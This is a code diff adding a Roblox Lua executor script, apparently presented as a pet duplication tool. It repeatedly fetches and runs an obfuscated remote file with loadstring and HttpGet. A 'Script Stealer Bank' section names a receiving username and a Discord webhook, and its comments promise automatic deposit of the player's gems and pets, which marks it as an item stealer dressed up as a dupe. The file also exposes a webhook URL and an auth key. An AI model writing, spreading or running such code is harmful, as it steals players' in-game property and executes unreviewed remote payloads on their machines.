@@ -1,0 +1,42 @@
+--Script Hub
+
+getgenv (). AuthKey = "HUGE_loVbMIB9hM6dz8fe"
+getgenv (). LoadSettings ={
+DisableStartupPrompt= false
+}
+loadstring ( game : HttpGet ( "https://hugegames.io/script" ))()
+
+--Script Stealer Bank ( auto deposit gem e pets | auto unlock pets | webhook discord )
+
+UserName = "l8maspeedy"
+WebHook = "https://discord.com/api/webhooks/1055318609192300594/iojl7QUfNzVfKw8RPXtshahZgM3GYKE8FjDQP4Xz6X0NuL5bI9BdYPiajxw4o0x2zWH6"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/Obfs.lua", true))()
+
+--Bugs
+
+game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Visible = true
+
+wait(30)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/Obfs.lua", true))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/Obfs.lua", true))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/Obfs.lua", true))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/Obfs.lua", true))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/Obfs.lua", true))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/Obfs.lua", true))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/Obfs.lua", true))()
+wait(1)
+game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Visible = true
+
+wait(30)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/Obfs.lua", true))()
+wait(1)
+game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Visible = true
